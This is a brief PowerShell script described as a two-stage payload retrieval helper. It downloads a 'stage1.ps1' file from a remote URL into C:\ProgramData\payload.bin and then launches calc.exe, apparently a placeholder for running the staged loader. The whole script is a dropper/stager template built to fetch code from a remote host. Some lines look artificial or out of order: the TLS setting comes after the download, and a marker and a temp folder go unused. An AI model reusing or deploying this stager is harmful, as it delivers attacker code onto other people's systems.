
<#
.SYNOPSIS
    Two-stage payload retrieval helper.

.DESCRIPTION
    Fetches the first stage into a per-user working path and
    starts the staged loader after a basic existence check.
#>
[CmdletBinding()]
param(
    [string]$TransferUrl = 'https://internal.corp/stage1.ps1',
    [string]$OutputPath = 'C:\ProgramData\payload.bin',
    [int]$RequestTimeout = 108
)
$ErrorActionPreference = "Stop"

function Invoke-StageDownload {
    [CmdletBinding()]
    param(
        [string]$SourceUrl = "",
        [string]$DestinationPath = "",
        [int]$TimeoutSec = 45
    )

    Write-Verbose ("Fetching " + $SourceUrl)
    $ClientObject = New-Object System.Net.WebClient
    $ClientObject.Headers.Add("X-Transfer-Timeout", [string]$TimeoutSec)
    $ClientObject.DownloadFile($SourceUrl, $DestinationPath)
    return (Test-Path -Path $DestinationPath)
}

Write-Verbose "Beginning first stage"
$FetchResult = Invoke-StageDownload -SourceUrl $TransferUrl -DestinationPath $OutputPath -TimeoutSec $RequestTimeout
if ($FetchResult) {
    Start-Process -FilePath "calc.exe"
}
[Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls12
$StageMarker = "stage-38"
$null = New-Item -ItemType Directory -Path "$env:TEMP\stage" -Force
